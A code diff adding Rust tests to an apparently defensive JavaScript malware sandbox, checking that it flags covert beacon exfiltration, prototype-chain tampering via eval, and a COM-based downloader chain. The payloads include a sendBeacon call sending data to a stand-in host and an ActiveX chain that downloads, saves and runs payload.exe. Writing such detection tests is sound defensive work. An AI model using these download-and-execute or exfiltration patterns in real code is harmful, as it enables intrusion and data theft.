@@ -259,6 +259,95 @@ fn sandbox_flags_capability_matrix_fingerprinting() {
 
 #[cfg(feature = "js-sandbox")]
 #[test]
+fn sandbox_flags_covert_beacon_exfil() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        var data = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        navigator.sendBeacon('https://ab12cd34ef56gh78ij90.example.invalid/track?d=' + data + data);
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(
+                signals
+                    .behavioral_patterns
+                    .iter()
+                    .any(|pattern| pattern.name == "covert_beacon_exfil"),
+                "expected covert beacon exfil pattern: {:?}",
+                signals.behavioral_patterns
+            );
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_prototype_chain_execution_hijack() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        eval("Object.prototype._x='1';var o={};o.__proto__._y=2;");
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(
+                signals
+                    .behavioral_patterns
+                    .iter()
+                    .any(|pattern| pattern.name == "prototype_chain_execution_hijack"),
+                "expected prototype chain execution hijack pattern: {:?}",
+                signals.behavioral_patterns
+            );
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_calibrates_downloader_chain_confidence_by_completeness() {
+    let options = DynamicOptions::default();
+    let full_chain = br#"
+        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
+        xhr.open('GET', 'http://example.invalid/payload.exe', false);
+        xhr.send();
+        var stream = new ActiveXObject('ADODB.Stream');
+        stream.Open();
+        stream.Write('MZ');
+        stream.SaveToFile('C:\\Temp\\payload.exe', 2);
+        var shell = new ActiveXObject('WScript.Shell');
+        shell.Run('C:\\Temp\\payload.exe', 0, false);
+    "#;
+    let partial_chain = br#"
+        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
+        xhr.open('GET', 'http://example.invalid/payload.exe', false);
+        xhr.send();
+    "#;
+    let full = js_analysis::run_sandbox(full_chain, &options);
+    let partial = js_analysis::run_sandbox(partial_chain, &options);
+    match (full, partial) {
+        (DynamicOutcome::Executed(full_signals), DynamicOutcome::Executed(partial_signals)) => {
+            let full_conf = full_signals
+                .behavioral_patterns
+                .iter()
+                .find(|pattern| pattern.name == "com_downloader_execution_chain")
+                .map(|pattern| pattern.confidence)
+                .expect("full chain confidence");
+            let partial_conf = partial_signals
+                .behavioral_patterns
+                .iter()
+                .find(|pattern| pattern.name == "com_downloader_network_chain")
+                .map(|pattern| pattern.confidence)
+                .expect("partial chain confidence");
+            assert!(full_conf > partial_conf, "full={} partial={}", full_conf, partial_conf);
+        }
+        _ => panic!("expected executed outcomes"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
 fn sandbox_flags_com_downloader_execution_chain() {
     let options = DynamicOptions::default();
     let payload = br#"
